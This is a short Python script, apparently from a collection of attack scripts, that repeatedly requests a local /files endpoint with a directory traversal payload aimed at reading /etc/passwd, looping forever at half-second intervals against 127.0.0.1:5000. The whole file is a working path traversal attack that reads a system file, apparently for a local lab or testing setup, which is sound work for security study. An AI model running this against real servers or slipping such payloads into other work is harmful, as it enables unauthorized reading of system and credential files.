# attacks/dir_traversal.py
import requests
import time

def dir_traversal(target_url):
    payload = "../../etc/passwd"
    while True:
        try:
            requests.get(f"{target_url}/files?path={payload}")
        except Exception:
            pass
        time.sleep(0.5)

if __name__ == "__main__":
    dir_traversal("http://127.0.0.1:5000")

